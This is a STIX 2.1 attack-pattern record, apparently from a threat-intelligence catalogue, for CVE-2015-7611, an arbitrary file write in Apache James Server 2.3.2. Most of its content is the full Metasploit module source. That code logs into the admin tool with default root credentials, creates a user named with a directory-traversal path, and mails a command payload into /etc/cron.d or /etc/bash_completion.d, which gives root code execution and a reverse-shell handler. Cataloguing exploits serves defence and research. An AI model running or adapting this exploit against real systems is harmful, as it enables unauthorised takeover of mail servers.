{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2dbe0d92-a167-4a35-875d-f9a97f6f8c29",
    "created": "2024-08-14T16:57:03.423383Z",
    "modified": "2024-08-14T16:57:03.423387Z",
    "name": "\"Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write\"",
    "description": " This module exploits a vulnerability that exists due to a lack of input validation when creating a user. Messages for a given user are stored in a directory partially defined by the username. By creating a user with a directory traversal payload as the username, commands can be written to a given directory. To use this module with the cron exploitation method, run the exploit using the given payload, host, and port. After running the exploit, the payload will be executed within 60 seconds. Due to differences in how cron may run in certain Linux operating systems such as Ubuntu, it may be preferable to set the target to Bash Completion as the cron method may not work. If the target is set to Bash completion, start a listener using the given payload host, and port before running the exploit. After running the exploit the payload will be executed when a user logs into the system. For this exploitation method, bash completion must be enabled to gain code execution. This exploitation method will leave an Apache James mail object artifact in the /etc/bash_completion.d directory and the malicious user account.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/smtp/apache_james_exec.rb",
            "external_id": "apache_james_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-7611"
        },
        {
            "source_name": "reference",
            "url": "https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write\",\n      'Description'    => %q{\n        This module exploits a vulnerability that exists due to a lack of input\n        validation when creating a user. Messages for a given user are stored\n        in a directory partially defined by the username. By creating a user\n        with a directory traversal payload as the username, commands can be\n        written to a given directory. To use this module with the cron\n        exploitation method, run the exploit using the given payload, host, and\n        port. After running the exploit, the payload will be executed within 60\n        seconds. Due to differences in how cron may run in certain Linux\n        operating systems such as Ubuntu, it may be preferable to set the\n        target to Bash Completion as the cron method may not work. If the target\n        is set to Bash completion, start a listener using the given payload,\n        host, and port before running the exploit. After running the exploit,\n        the payload will be executed when a user logs into the system. For this\n        exploitation method, bash completion must be enabled to gain code\n        execution. This exploitation method will leave an Apache James mail\n        object artifact in the /etc/bash_completion.d directory and the\n        malicious user account.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n        'Palaczynski Jakub', # Discovery\n        'Matthew Aberegg',   # Metasploit\n        'Michael Burkey'     # Metasploit\n      ],\n      'References'     =>\n      [\n        [ 'CVE', '2015-7611' ],\n        [ 'EDB', '35513' ],\n        [ 'URL', 'https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf' ]\n      ],\n      'Platform'       => 'linux',\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'Targets'        =>\n      [\n        [ 'Bash Completion', {\n          'ExploitPath' => 'bash_completion.d',\n          'ExploitPrepend' => '',\n          'DefaultOptions' => { 'DisablePayloadHandler' => true, 'WfsDelay' => 0 }\n        } ],\n        [ 'Cron', {\n          'ExploitPath' => 'cron.d',\n          'ExploitPrepend' => '* * * * * root ',\n          'DefaultOptions' => { 'DisablePayloadHandler' => false, 'WfsDelay' => 90 }\n        } ]\n      ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2015-10-01',\n      'DefaultTarget'  => 1,\n      'CmdStagerFlavor'=> [ 'bourne', 'echo', 'printf', 'wget', 'curl' ]\n      ))\n      register_options(\n        [\n          OptString.new('USERNAME', [ true, 'Root username for James remote administration tool', 'root' ]),\n          OptString.new('PASSWORD', [ true, 'Root password for James remote administration tool', 'root' ]),\n          OptString.new('ADMINPORT', [ true, 'Port for James remote administration tool', '4555' ]),\n          OptString.new('POP3PORT', [false, 'Port for POP3 Apache James Service', '110' ]),\n          Opt::RPORT(25)\n        ])\n  end\n\n  def check\n    # SMTP service check\n    connect\n    smtp_banner = sock.get_once\n    disconnect\n    unless smtp_banner.to_s.include? \"JAMES SMTP Server\"\n      return CheckCode::Safe(\"Target port #{rport} is not a JAMES SMTP server\")\n    end\n\n    # James Remote Administration Tool service check\n    connect(true, {'RHOST' => datastore['RHOST'], 'RPORT' => datastore['ADMINPORT']})\n    admin_banner = sock.get_once\n    disconnect\n    unless admin_banner.to_s.include? \"JAMES Remote Administration Tool\"\n      return CheckCode::Safe(\"Target is not JAMES Remote Administration Tool\")\n    end\n\n    # Get version number\n    version = admin_banner.scan(/JAMES Remote Administration Tool ([\\d\\.]+)/).flatten.first\n    # Null check\n    unless version\n      return CheckCode::Detected(\"Could not determine JAMES Remote Administration Tool version\")\n    end\n    # Create version objects\n    target_version = Rex::Version.new(version)\n    vulnerable_version = Rex::Version.new(\"2.3.2\")\n\n    # Check version number\n    if target_version > vulnerable_version\n      return CheckCode::Safe\n    elsif target_version == vulnerable_version\n      return CheckCode::Appears\n    elsif target_version < vulnerable_version\n      return CheckCode::Detected(\"Version #{version} of JAMES Remote Administration Tool may be vulnerable\")\n    end\n  end\n\n  def execute_james_admin_tool_command(cmd)\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n    connect(true, {'RHOST' => datastore['RHOST'], 'RPORT' => datastore['ADMINPORT']})\n    sock.get_once\n    sock.puts(username + \"\\n\")\n    sock.get_once\n    sock.puts(password + \"\\n\")\n    sock.get_once\n    sock.puts(cmd)\n    sock.get_once\n    sock.puts(\"quit\\n\")\n    disconnect\n  end\n\n  def cleanup\n    return unless target['ExploitPath'] == \"cron.d\"\n    # Delete mail objects containing payload from cron.d\n    username = \"../../../../../../../../etc/cron.d\"\n    password = @account_password\n    begin\n      connect(true, {'RHOST' => datastore['RHOST'], 'RPORT' => datastore['POP3PORT']})\n      sock.get_once\n      sock.puts(\"USER #{username}\\r\\n\")\n      sock.get_once\n      sock.puts(\"PASS #{password}\\r\\n\")\n      sock.get_once\n      sock.puts(\"dele 1\\r\\n\")\n      sock.get_once\n      sock.puts(\"quit\\r\\n\")\n      disconnect\n    rescue\n      print_bad(\"Failed to remove payload message for user '../../../../../../../../etc/cron.d' with password '#{@account_password}'\")\n    end\n\n    # Delete malicious user\n    delete_user_command = \"deluser ../../../../../../../../etc/cron.d\\n\"\n    execute_james_admin_tool_command(delete_user_command)\n  end\n\n  def execute_command(cmd, opts = {})\n    # Create malicious user with randomized password (message objects for this user will now be stored in /etc/bash_completion.d or /etc/cron.d)\n    exploit_path = target['ExploitPath']\n    @account_password = Rex::Text.rand_text_alpha(8..12)\n    add_user_command = \"adduser ../../../../../../../../etc/#{exploit_path} #{@account_password}\\n\"\n    execute_james_admin_tool_command(add_user_command)\n\n    # Send payload via SMTP\n    payload_prepend = target['ExploitPrepend']\n    connect\n    sock.puts(\"ehlo admin@apache.com\\r\\n\")\n    sock.get_once\n    sock.puts(\"mail from: <'@apache.com>\\r\\n\")\n    sock.get_once\n    sock.puts(\"rcpt to: <../../../../../../../../etc/#{exploit_path}>\\r\\n\")\n    sock.get_once\n    sock.puts(\"data\\r\\n\")\n    sock.get_once\n    sock.puts(\"From: admin@apache.com\\r\\n\")\n    sock.puts(\"\\r\\n\")\n    sock.puts(\"'\\n\")\n    sock.puts(\"#{payload_prepend}#{cmd}\\n\")\n    sock.puts(\"\\r\\n.\\r\\n\")\n    sock.get_once\n    sock.puts(\"quit\\r\\n\")\n    sock.get_once\n    disconnect\n  end\n\n  def execute_cmdstager_end(opts)\n    if target['ExploitPath'] == \"cron.d\"\n      print_status(\"Waiting for cron to execute payload...\")\n    else\n      print_status(\"Payload will be triggered when someone logs onto the target\")\n      print_warning(\"You need to start your handler: 'handler -H #{datastore['LHOST']} -P #{datastore['LPORT']} -p #{datastore['PAYLOAD']}'\")\n      print_warning(\"After payload is triggered, delete the message and account of user '../../../../../../../../etc/bash_completion.d' with password '#{@account_password}' to fully clean up exploit artifacts.\")\n    end\n  end\n\n  def exploit\n    execute_cmdstager(background: true)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2015-10-01",
    "x_mitre_platforms": [
        "linux'"
    ]
}